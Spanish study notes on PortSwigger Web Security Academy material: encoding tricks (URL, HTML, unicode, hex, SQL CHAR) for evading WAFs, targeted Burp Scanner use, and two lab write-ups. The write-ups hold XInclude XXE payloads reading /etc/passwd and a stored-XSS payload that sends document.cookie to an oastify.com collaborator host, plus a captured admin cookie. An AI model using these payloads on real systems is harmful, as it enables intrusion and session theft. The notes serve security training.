Sen han diseñado los laboratorios para que la Academia de Seguridad Web sea lo más realista posible, pero debo tener en cuenta que cada laboratorio demuestra una sola posible variación de una vulnerabilidad dada. En la práctica, es importante ser capaz de reconocer sutilmente diferentes ocurreciones de los mismos errores subyacentes y saber cómo adaptar las técnicas que he aprendido en consecuencia.

En esta sección, aprenderás algunas habilidades ampliamente aplicables que te ayudarán a aplicar lo que has aprendido de nuestros laboratorios a otros objetivos vivos. Cubrimos una gama de consejos y trucos generales, así como cómo utilizar algunas de las características menos conocidas de Burp para optimizar su flujo de trabajo. También hemos proporcionado algunos laboratorios adicionales, para que puedas probar esto por ti mismo.

Planeamos ampliar esta sección para cubrir habilidades más esenciales en un futuro cercano.

## Obfuscar ataques mediante codificación →

Simplemente copiar los ataques de nuestras soluciones de laboratorio e intentarlos en sitios reales sólo te llevará hasta cierto punto. Los sitios web que usted probará a menudo ya serán auditados por otros usuarios y se les aplicaron una serie de parches. Para llevar tus habilidades más lejos, necesitarás adaptar las técnicas que has aprendido a superar estos obstáculos adicionales, desenterrando vulnerabilidades que otros probadores pueden haber pasado por alto.

En esta sección, le proporcionaremos algunas sugerencias sobre cómo puede ofuscar cargas útiles dañinas para evadir filtros de entrada y otras defensas defectuladas. Especízco, aprenderás a usar codificaciones estándar para aprovechar las configuraciones erróneas y las discrepancias de manejo entre sistemas conectados.

### **Obfuscating attacks using encodings**

En esta sección, le mostraremos cómo puede aprovechar la decodificación estándar realizada por los sitios web para evadir los filtros de entrada e inyectar cargas útiles dañinas para una variedad de ataques, como XSS y inyección SQL.

### **Context-specific decoding**

Tanto los clientes como los servidores utilizan una variedad de diferentes codificaciones para pasar datos entre sistemas. Cuando realmente quieren usar los datos, esto a menudo significa que tienen que decodificarlos primero. La secuencia exacta de los pasos decodificación que se realizan depende del contexto en el que aparezcan los datos. Por ejemplo, un parámetro de consulta es típicamente descodificado de la URL lado del servidor, mientras que el contenido de texto de un elemento HTML puede ser decodificado por el cliente de HTML.

Al construir un ataque, deberías pensar en dónde se está inyectando exactamente tu carga útil. Si puede inferir cómo se está decodificando su entrada en base a este contexto, puede identificar formas alternativas de representar la misma carga útil.

### **Decoding discrepancies**

Los ataques de inyección a menudo implican inyectar cargas útiles que utilizan patrones reconocibles, como etiquetas HTML, funciones JavaScript o declaraciones SQL. Como las entradas para estas cargas útiles casi nunca se espera que contengan código o marcado suministrado por el usuario, los sitios web a menudo implementan defensas que bloquean las solicitudes que contienen estos patrones sospechosos.

Sin embargo, este tipo de filtros de entrada también necesitan decodificar la entrada para comprobar si es seguro o no. Desde una perspectiva de seguridad, es vital que la decodificación realizada al comprobar la entrada sea la misma que la decodificación realizada por el servidor o navegador de back-end cuando finalmente utiliza los datos. Cualquier discrepancia puede permitir a un atacante colar cargas útiles dañinas más allá del filtro aplicando diferentes codificaciones que se eliminarán automáticamente más adelante.

## Obfuscación a través de la codificación URL

En las URLs, una serie de caracteres reservados tienen un significado especial. Por ejemplo, un ampersand (`&`) se utiliza como delimitador para separar parámetros en la cadena de consulta. El problema es que las entradas basadas en URL pueden contener estos caracteres por una razón diferente. Considere un parámetro que contenga la consulta de búsqueda de un usuario. Qué pasa si el usuario busca algo como "Fish & Chips"?

Los navegadores codifican automáticamente cualquier caracter que pueda causar ambiguedad para los parsers. Esto generalmente significa sustituirlos por un `%`carácter y su código hex de 2 dígitos de la siguiente manera:

```
[...]/?search=Fish+%26+Chips
```

Esto asegura que los ampersand no se confundirán con un delimitador.

> Aunque el carácter espacial puede ser codificado como `%20`, a menudo está representado por un plus (`+`) en cambio, como en el ejemplo anterior.

Cualquier entrada basada en URL se decodifica automáticamente URL lado del servidor decodificado antes de que se asigne a las variables relevantes. Esto significa que, en lo que respecta a la mayoría de los servidores, secuencias como `%22`, `%3C`, y `%3E`en un parámetro de consulta son sinónimos de `"`, `<`, y `>`caracteres respectivamente. En otras palabras, puede inyectar datos codificados por URL a través de la URL y por lo general todavía se interpretará correctamente por la aplicación back-end.

Ocasionalmente, puedes encontrar que WAFs y similares no logran decodificar correctamente tu entrada al comprobarlo. En este caso, usted puede ser capaz de contrabandar cargas útiles a la aplicación back-end simplemente codificando cualquier caracter o palabra que se enlistan en la lista negra. Por ejemplo, en un ataque de inyección SQL, puede codender las palabras clave, así que `SELECT`se convierte `%53%45%4C%45%43%54`y así sigue.

## Obfuscación a través de la codificación de URL doble

Por una u otra razón, algunos servidores realizan dos rondas de decodificación de URL en cualquier URL que reciban. Esto no es necesariamente un problema por derecho propio, siempre que cualquier mecanismo de seguridad también decodificara la entrada al comprobarlo. De lo contrario, esta discrepancia permite a un atacante contrabandera entrada maliciosa al back-end simplemente codificarlo dos veces.

Digamos que estás tratando de inyectar un XSS PoC estándar, como `<img src=x onerror=alert(1)>`, a través de un parámetro de consulta. En este caso, la URL podría verse algo así:

```
[...]/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

Al comprobar la solicitud, si una WAF realiza la decodificación de URL estándar, identificará fácilmente esta carga útil bien conocida. La petición está bloqueada de llegar a la parte trasa-final. Pero y si encoderas la inyección? En la práctica, esto significa que la `%`los caracter mismos son luego reemplazados por `%25`:

```
[...]/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```

Como la WAF sólo decodifica esta vez, puede no ser capaz de identificar que la solicitud es peligrosa. Si el servidor de back-end posteriormente doble-decodifica esta entrada, la carga útil se inyectará con éxito.

## Obfuscación a través de la codificación HTML

En los documentos HTML, ciertos caracteres necesitan ser escapados o codificados para evitar que el navegador los interprete incorrectamente como parte del marcador. Esto se logra sustituyendo a los personajes ofensor con una referencia, prefijo por una ampersand y terminado con un punto y coma. En muchos casos, un nombre puede ser utilizado para la referencia. Por ejemplo, la secuencia `&colon;`representa un carácter de colon.

Alternativamente, la referencia podrá facilitarse utilizando el punto de código decimal o hexabón del carácter, en este caso, `&#58;`y `&#x3a;`respectivamente.

En ubicaciones específicas dentro del HTML, como el contenido de texto de un elemento o el valor de un atributo, los navegadores decodificarán automáticamente estas referencias cuando analicen el documento. Al inyectarse dentro de tal ubicación, ocasionalmente puedes aprovechar esto para ofuscar cargas útiles para ataques con el lado del cliente, escondiéndolos de cualquier defensa del lado del servidor que esté en su lugar.

Si usted mira de cerca la carga útil XSS de nuestro ejemplo anterior, observe que la carga útil está siendo inyectada dentro de un atributo HTML, a saber, el `onerror`Manejador de eventos. Si las comprobaciones del lado del servidor están buscando el `alert()`De sumación explícitamente, no detectarán esto si usted HTML codifica uno o más de los personajes:

```
<img src=x onerror="&#x61;lert(1)">
```

Cuando el navegador rendere la página, decodificará y ejecutará la carga útil inyectada.

### Líbano de ceros

Curiosamente, cuando se utiliza la codificación HTML decimal o de estilo hex, puede incluir opcionalmente un número arbitrario de ceros principales en los puntos de código. Algunas WAF y otros filtros de entrada no tienen debidamente en cuenta esto.

Si su carga útil todavía se bloquea después de la codificación HTML, puede encontrar que puede evadir el filtro con sólo prefijar los puntos de código con unos pocos ceros:

```
<a href="javascript&#00000000000058;alert(1)">Click me</a>
```

## Obfuscación a través de la codificación XML

XML está estrechamente relacionado con HTML y también admite la codificación de caracteres usando las mismas secuencias de escape numéricas. Esto le permite incluir caracteres especiales en el contenido de texto de los elementos sin romper la sintaxis, que puede ser útil cuando se prueba para XSS a través de la entrada basada en XML, por ejemplo.

Incluso si usted no necesita codificar ningún personaje especial para evitar errores de sintaxis, potencialmente puede tomar ventaja de este comportamiento para ofuscar cargas útiles de la misma manera que lo hace con la codificación HTML. La diferencia es que su carga útil es decodificada por el propio servidor, en lugar del lado del cliente por un navegador. Esto es útil para eludir los WAFs y otros filtros, que pueden bloquear sus solicitudes si detectan ciertas palabras clave asociadas con ataques de inyección SQL.

```
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

## Obfuscación a través de unicode escapando

Las secuencias de escape de Unicode consisten en el prefijo `\\u`seguido por el código hex de cuatro dígitos para el caracter. Por ejemplo, `\\u003a`representa un colon. ES6 también es compatible con una nueva forma de escape unicode utilizando aparatos rizado: `\\u{3a}`.

Al analizar las cuerdas, la mayoría de los lenguajes de programación decodifican estos unicode se escapa. Esto incluye el motor JavaScript utilizado por los navegadores. Al inyectarse en un contexto de cuerda, puedes ofuscar cargas útiles del lado del cliente usando unicode, al igual que hicimos con HTML escapa en el ejemplo de arriba.

Por ejemplo, digamos que estás tratando de explotar DOM XSS donde tu entrada se pasa al `eval()`se hunde como una cuerda. Si sus intentos iniciales están bloqueados, intente escapar de uno de los caracteres de la siguiente manera:

```
eval("\\u0061lert(1)")
```

Como este seguirá siendo el lado del servidor codificado, puede pasar desapercable hasta que el navegador lo decodifica de nuevo.

> Dentro de una cuerda, puedes escapar de cualquier personaje como este. Sin embargo, fuera de una cadena, escapar de algunos caracteres resultará en un error de sintaxis. Esto incluye la apertura y cierre de los paréntesis, por ejemplo. También vale la pena señalar que los escapes unicode al estilo ES6 también permiten ceros de salida opcionales, por lo que algunos WAF pueden ser fácilmente engañados usando la misma técnica que utilizamos para las codificaciones HTML. Por ejemplo:
> 
> ```
> <a href="javascript:\\u{00000000061}alert(1)">Click me</a>
> ```

## Obfuscación a través de hex escapando

Otra opción al inyectarse en un contexto de cadena es utilizar escapes hex, que representan caracteres usando su punto de código hexadecimal, prefijo con `\\x`. Por ejemplo, la letra minúscula `a`está representada por `\\x61`.

Al igual que unicode escapa, estos serán decodificados con el cliente-lados mientras la entrada sea evaluada como una cadena:

```
eval("\\x61lert")
```

Tenga en cuenta que a veces también puede ofuscar las declaraciones de SQL de una manera similar usando el prefijo `0x`. Por ejemplo, `0x53454c454354`puede ser decodificado para formar la `SELECT`Palabra clave.

## Obfuscación por fuga octal

El octal escapando funciona de la misma manera que escapar de hex, excepto que las referencias de caracteres utilizan un sistema de numeración base-8 en lugar de base-16. Estos están prefijo con una reacción independiente, lo que significa que la letra minúscula `a`está representada por `\\141`.

```
eval("\\141lert(1)")
```

## Obfuscación a través de múltiples codificaciones

Es importante tener en cuenta que puede combinar codificaciones para ocultar sus cargas tras múltiples capas de ofuscación. Mira el `javascript:`URL en el siguiente ejemplo:

```
<a href="javascript:&bsol;u0061lert(1)">Click me</a>
```

Navegadores primero decodificarán HTML `&bsol;,`resultando en una reacción. Esto tiene el efecto de convertir el `u0061`personajes en la fuga de unicode `\\u0061`:

```
<a href="javascript:\\u0061lert(1)">Click me</a>
```

Esto se decodifica más para formar una carga útil XSS en funcionamiento:

```
<a href="javascript:alert(1)">Click me</a>
```

Claramente, para inyectar con éxito una carga útil de esta manera, necesita una comprensión sólida de qué decodificación se realiza en su entrada y en qué orden.

## Obfuscación a través de la función SQL CHAR()

Aunque no es estrictamente una forma de codificación, en algunos casos, es posible que pueda ofuscar sus ataques de inyección SQL usando el `CHAR()`función. Esto acepta un único punto de código decimal o hex y devuelve el carácter que coincide. Los códigos Hex deben ser prefijos con `0x`. Por ejemplo, ambos `CHAR(83)`y `CHAR(0x53)`devolver la letra mayúscula `S`.

Al concatenizar los valores devueltos, puede utilizar este enfoque para ofuscar palabras clave bloqueadas. Por ejemplo, incluso si `SELECT`se sitúa en la lista negra, la siguiente inyección parece inicialmente inofenable:

```
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
```

Sin embargo, cuando esto se transforme como SQL por la aplicación, construirá dinámicamente el `SELECT`palabra clave y ejecutar la consulta inyectada.

![[Pasted image 20250220170224.png]]

Puede que esto no alcance hasta la última vulnerabilidad, pero potencialmente podría marcar cosas en segundos que de otra manera podrían haber tomado horas para encontrar. También puede ayudarle a descartar ciertos ataques casi inmediatamente. Todavía puede realizar pruebas más específicas usando las herramientas manuales de Burp, pero podrá concentrar sus esfuerzos en entradas específicas y un rango más estrecho de vulnerabilidades potenciales.

Incluso si ya usa Burp Scanner para ejecutar un gateo general y la auditoría de nuevos objetivos, cambiar a este enfoque más específico de la auditoría puede reducir masivamente su tiempo de escaneo general.

---
# Uso de Burp Scanner durante pruebas manuales

En esta sección, le mostraremos una serie de maneras en que puede optimizar su flujo de trabajo de pruebas manual mediante el uso de Burp Scanner para complementar su propio conocimiento e intuición. Esto no sólo le ayudará a cubrir más terreno, usted será capaz de pasar su tiempo donde importa en lugar de en el trabajo preliminar tedioso.

## Escaneando una petición específica

Cuando se encuentra con una función o comportamiento interesante, su primer instinto puede ser enviar las solicitudes relevantes a Repeater o Intruso e investigar más. Pero a menudo es beneficioso entregar la petición a Burp Scanner también. Puede llegar a trabajar en los aspectos más repetitivos de las pruebas mientras pones tus habilidades a un mejor uso en otro lugar.

Si hace clic derecho en una solicitud y **seleccione Do escáner activo**, Burp Scanner usará su configuración predeterminada para auditar sólo esta solicitud.

## Escaneando puntos de inserción personalizados

Es fácil ver los beneficios de limitar sus escaneos a una sola solicitud, pero usted puede llevar esto un paso más lejos al sólo probar entradas específicas dentro de esa solicitud. Puedes hacer esto desde el editor de mensajes.

Resuelver el punto de inserción que le interesan, haga clic derecho y seleccione **Escanear el punto de inserción seleccionado**.

![[Pasted image 20250220170317.png]]

Esto le permite centrarse en la entrada que le interesa, en lugar de escanear contenido adicional que usted sabe que es poco probable que sea útil.

Aunque sólo puede definir un único punto de inserción usando Intruder, a menudo es más rápido utilizar la extensión [del punto](https://portswigger.net/bappstore/ca7ee4e746b54514a0ca5059329e926f) de [inserción manual de exploración](https://portswigger.net/bappstore/ca7ee4e746b54514a0ca5059329e926f). Puede resaltar cualquier secuencia de caracteres dentro de la solicitud, típicamente un valor de parámetro, y **seleccione Extensiones . Escanear el punto** de **inserción manual** del menú contextual.

Este enfoque puede dar resultados increíblemente rápido, dándote algo con lo que trabajar en sólo un par de segundos. También significa que puede elegir escanear las entradas que Burp Scanner normalmente no usa, como los valores de encabezado personalizados.

## Escaneando estructuras de datos no estándar

Como usted es libre de definir puntos de inserción en posiciones arbitrarias, también puede apuntar a una subcadeación específica dentro de un valor. Entre otras cosas, esto puede ser útil para escanear estructuras de datos no estándar.

Cuando se trata de formatos comunes, como JSON, Burp Scanner es capaz de analizar los datos y colocar cargas útiles en las posiciones correctas sin romper la estructura. Sin embargo, considere un parámetro que se vea algo así:

```
user=048857-carlos
```

Usando nuestra intuición, podemos adivinar que esto será tratado como dos valores distintos por el back-end: un ID de algún tipo y lo que parece ser un nombre de usuario, separado por un guión. Sin embargo, Burp Scanner tratará todo esto como un solo valor. Como resultado, sólo colocará cargas útiles al final del parámetro, o reemplazará el valor por completo.

Para ayudar a escanear estructuras de datos no estándar, puede escanear una sola parte de un parámetro. En este ejemplo puede que quieras apuntar `carlos`. Puedes destacar `carlos`en el editor de mensajes, luego haga clic derecho y **seleccione** Ecáner **el punto de inserción seleccionado**.

También puede utilizar Intruder para definir múltiples puntos de inserción. En el ejemplo anterior, puede definir puntos de inserción para 048857 y carlos, entonces haga clic derecho y seleccione Escanear puntos de inserción definidos.

<hr> 

# Laboratorios destinados unicamente a pulir nuestras habilidades como pentesters, ethical hackers. 

### LAB: Discovering vulnerabilities quickly with targeted scanning

## ¿Cómo resolvimos este lab?

Es de suma importancia la info que encontremos del burp scan tirar de una una pequeña investigación busqueda en internet, nos puede ahorrar mucho tiempo, en este caso el endpoint que inicié a escanear fue el POST de check Stock/ →

![[Pasted image 20250220165845.png]]

Aqui mismo dice muy bien XML Injection, y una de las vulnerabilideades que podemos explotar con el XXE es poder leer u obtener archivos arbitrarios, en este caso vemos que tanto el parametro productId como el parametro storeId son vulnerables al XXE.

![[Pasted image 20250220165855.png]]

```xml
<lws xmlns:xi="http://www.w3.org/2001
/XInclude"><xi:include href="http://0
207gntpn7jh8wuysc7sf9k1tszlngbhz9mzao.oastify.
com/foo"/></lws> 
En este caso ofuscado a URl: 
%3clws%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a%2f%2f0207gntpn7jh8wuysc7sf9k1tszlngbhz9mzao.oastify.com%2ffoo%22%2f%3e%3c%2flws%3e
SIN EMBARGO EN HREF PODRÍA SER POSIBLE PROBAR TAMBIEN: 
"file:///etc/passwd"
```

Vemos que en el ejemplo de ataque la etiqueta XML de ataque es importando un XInclude, si yo llego e intento crear el ataque manualmente puedo llegar a hacerlo si no tuviera un tiempo definido contra reloj pero en este caso tenemos 10 min contados para resolver el lab, en este caso con la DB de payload-all the things podemos indagar sobre los ataques y encontramos que hay un tipo de ataque XXE el cual se basa en la importación de XInclude debido a que no se puede llamar a la DTD osea la Doctype, y si en esencia no se podía yo había intentado con todos mi payloads de mi material de estudio sobre XXE, como:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

Pero en este caso no era por ahí sino por la forma de XiNCLUDE.

![[Pasted image 20250220170004.png]]

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

En ese caso basta con tomarlo e intentar obfuscarlo a URL tal cual como el PoC que burp scanner nos dejó.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

%3Cfoo%20xmlns%3Axi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXInclude%22%3E%0A%3Cxi%3Ainclude%20parse%3D%22text%22%20href%3D%22file%3A%2F%2F%2Fetc%2Fpasswd%22%2F%3E%3C%2Ffoo%3E
```

![[Pasted image 20250220170103.png]]

![[Pasted image 20250220170111.png]]

---
### LAB: Scanning non-standard data structures

Ya analizando los endpoints puedo ver algo extraño…

![[Pasted image 20250220170418.png]]

La cookie de session se maneja de una manera un tanto extraña, no es una estructura de datos estandar se maneja del tipo `session=username%3acookieValue`

Selecciono el user wiener de la cookie y le hago un `Scan Selected Insertion Point`

![[Pasted image 20250220170439.png]]

El escaneo reporta un cross site scripting stored.

Tengo que tirar un ataque por este medio de esa forma que me permita robar la cookie de sessión del administrador user.

```xml
Payload del reporte: 
'"><svg/onload=fetch`//kc0rq739xrt1ig4i2whcptul3c9dx3lvbj29pzdo\\.oastify.com`>
'"><svg/onload=fetch`//85bj426yutnalb6lkg3rvn6ik9q0ey2n\\.oastify.com/?leaked='+document.cookie;`>
'%22%3E%3Csvg%2Fonload%3Dfetch%60%2F%2F85bj426yutnalb6lkg3rvn6ik9q0ey2n%5C.oastify.com%2F%3Fleaked%3D%22%2Bdocument.cookie%3B%60%3E
```

```xml
'"><svg/onload=fetch`//85bj426yutnalb6lkg3rvn6ik9q0ey2n\\.oastify.com\\'+document.cookie);`>
'"><svg/onload=fetch`//85bj426yutnalb6lkg3rvn6ik9q0ey2n\\.oastify.com/'+document.cookie);`>
```

---

```xml
(')"><svg/onload=fetch`//6biha0cw0rt8r9cjqe9p1lcgq7wyk08p\\.oastify.com\\?c='+document.cookie;`>

(')"><svg/onload=fetch`//gp9n33g5an6xvchefsu82p7hg8mda3yvojf92zqo\\.oastify.com`>
```

#### Tan simple como preguntarle a mi buen amigo chatgpt como se concatena la document.cookie a una etiqueta svg 🙂

![[Pasted image 20250220170512.png]]

Mi carga util o payload final fue este:

```js
//Todo codeado a url excepto el ' que está dentro de parentesis (sin parentesis claro)
(')"><svg/onload=fetch(`//rhc2glih6cztxui4wzfa76i1ws2jqnec\.oastify.com?c=${document.cookie}`)>
-------------------Payload final encoded---------------------
'%22%3E%3Csvg%2Fonload%3Dfetch%28%60%2F%2Frhc2glih6cztxui4wzfa76i1ws2jqnec%5C.oastify.com%3Fc%3D%24%7Bdocument.cookie%7D%60%29%3E
```

![[Pasted image 20250220170606.png]]

Lo enviamos y es cuestión de analizar las respuesta de burp collaborator →

![[Pasted image 20250220170618.png]]
Nos ha llegado nuestra cookie concatenada a nuestro server burp collaborator.

```js
//EVIDENTEMENTE LA COOKIE SE ACTUALIZA EN CADA SESIÓN (por si crees que esta te va a funcionar)
session=administrator:vnQjZ2D2JUCVDfxrXjQjmvFzd4v1enKp; 
secret=kqGqkl58UkVS6v5tjELGJs0sv9wKimij; 
session=administrator:vnQjZ2D2JUCVDfxrXjQjmvFzd4v1enKp
```

![[Pasted image 20250220170642.png]]

Actualizamos la cookie y bOOM, tenemos acceso al admin panel:
![[Pasted image 20250220170652.png]]
Listo, tan simple y bonito como eliminar al user carlos.
![[Pasted image 20250220170702.png]]

![[Pasted image 20250220170708.png]]

---

Esos sería todo de habilidades para la vida, y ethical hacker. 